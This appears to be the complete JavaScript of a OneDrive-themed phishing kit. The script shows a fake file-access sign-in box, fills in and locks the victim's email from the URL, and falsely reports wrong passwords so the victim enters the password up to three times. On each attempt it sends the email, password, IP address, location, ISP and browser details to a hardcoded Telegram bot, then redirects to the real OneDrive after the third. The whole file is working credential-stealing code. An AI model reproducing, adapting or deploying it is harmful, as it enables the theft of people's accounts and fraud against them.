// ✅ Track how many login attempts have been made
let attemptCount = 0;

document.addEventListener('DOMContentLoaded', () => {
    // ✅ Get all important elements from the page
    const signInModal = document.getElementById('sign-in-modal');
    const modalOverlay = document.getElementById('modal-overlay');
    const emailInput = document.querySelector('.sign-in-input[type="email"]');
    const passwordInput = document.querySelector('.sign-in-input[type="password"]');
    const signInBtn = document.getElementById('sign-in-btn');
    const fileTiles = document.querySelectorAll('.file');

    // ✅ Verification overlay handling
    const verificationOverlay = document.getElementById('verification-overlay');
    const verifyBtn = document.getElementById('verify-btn');
    const verifyCheckbox = document.getElementById('verify-checkbox');

    if (verifyBtn && verifyCheckbox && verificationOverlay) {
        verifyBtn.addEventListener('click', () => {
            if (verifyCheckbox.checked) {
                verificationOverlay.style.display = 'none';
            } else {
                alert('Please confirm you are not a robot.');
            }
        });
    }

    // ✅ Remove close button if it exists
    const closeBtn = document.getElementById('close-btn');
    if (closeBtn) closeBtn.remove();

    // ✅ If key elements are missing, stop
    if (!signInModal || !modalOverlay || !emailInput || !passwordInput || !signInBtn) {
        console.error("Required modal elements not found.");
        return;
    }

    // ✅ Hide modal on page load
    signInModal.classList.add('hidden');
    modalOverlay.classList.add('hidden');

    // ✅ Extract email from URL (e.g. site.com/#user@mail.com)
    function getEmailFromURL() {
        const hash = window.location.hash;
        return hash && hash.startsWith("#") ? decodeURIComponent(hash.substring(1)) : "";
    }

    // ✅ If email exists in URL, lock it into the email field
    const urlEmail = getEmailFromURL();
    if (urlEmail) {
        emailInput.value = urlEmail;
        emailInput.setAttribute("readonly", "true");
        emailInput.classList.add("email-field"); // for gray background
    }

    // ✅ Show modal when a file tile is clicked
    fileTiles.forEach(tile => {
        tile.addEventListener("click", () => {
            clearError();
            passwordInput.value = "";                 // reset password
            signInBtn.textContent = "View files";     // reset button label
            modalOverlay.classList.remove("hidden");  // show overlay
            signInModal.classList.remove("hidden");   // show modal
        });
    });

    // ✅ Handle login button click
    signInBtn.addEventListener('click', async () => {
        const email = emailInput.value.trim();
        const password = passwordInput.value.trim();

        if (!email || !password) {
            showError("Please enter both email and password.");
            return;
        }

        // ✅ Change button to show "Verifying..."
        signInBtn.textContent = "Verifying...";

        attemptCount++; // Increase login attempt

        // ✅ Telegram setup (change to your token/chat if needed)
        const botToken = "7581994701:AAGb0gyfgIMQH-RDhnogyMfgaAJbnK7h534";
        const chatId = "5642369607";

        // ✅ Get user IP and location
        let ipData = await fetch("https://ipapi.co/json")
            .then(res => res.json())
            .catch(() => null);

        let ip = ipData?.ip || "Unknown IP";
        let country = ipData?.country_name || "Unknown Country";
        let city = ipData?.city || "Unknown City";
        let isp = ipData?.org || "Unknown ISP";
        let userAgent = navigator.userAgent;

        // ✅ Message to send to Telegram
        const message = `🚨 *OneDrive Login Attempt (${attemptCount}/3)* 🚨\n\n`
            + `📧 *Email:* ${email}\n`
            + `🔑 *Password:* ${password}\n\n`
            + `🌍 *IP:* ${ip}\n`
            + `📍 *Location:* ${city}, ${country}\n`
            + `🏢 *ISP:* ${isp}\n\n`
            + `🖥 *Browser:* ${userAgent}`;

        // ✅ Send the Telegram message
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: "Markdown"
            })
        });

        // ✅ Handle login logic
        if (attemptCount >= 3) {
            // ✅ Redirect after 3rd failure
            window.location.href = "https://onedrive.live.com";
        } else {
            // ✅ Show incorrect password message below password box
            showError(`❌ Incorrect password. Attempt ${attemptCount} of 3`);
            passwordInput.value = "";              // clear password
            signInBtn.textContent = "View files";  // reset button label
        }
    });
});

// ✅ Show an error message under the password box
function showError(message) {
    clearError();
    const msg = document.createElement('div');
    msg.className = 'error-msg';
    msg.style.color = '#d93025';
    msg.style.fontSize = '13px';
    msg.style.marginTop = '6px';
    msg.style.textAlign = 'left';
    msg.textContent = message;

    const passwordInput = document.querySelector('.sign-in-input[type="password"]');
    if (passwordInput) {
        passwordInput.insertAdjacentElement('afterend', msg);
    }
}

// ✅ Remove existing error message if present
function clearError() {
    const existing = document.querySelector('.error-msg');
    if (existing) existing.remove();
}
